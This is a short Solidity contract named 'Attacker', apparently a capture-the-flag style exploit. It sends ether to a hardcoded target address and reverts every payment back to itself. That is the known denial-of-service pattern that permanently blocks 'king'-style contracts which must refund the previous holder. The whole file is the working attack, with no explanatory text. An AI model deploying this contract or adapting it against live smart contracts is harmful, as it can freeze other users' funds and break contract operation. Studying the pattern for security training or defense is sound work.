// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attacker {

    address payable target = payable(0x8709405A8FBAe5526814fADE467553f7732487ad);

    function attack() public payable returns (bool) {
        (bool success,) = target.call{ value: msg.value }("");
        return success;
    }
    receive() external payable {
        revert();
    }
}
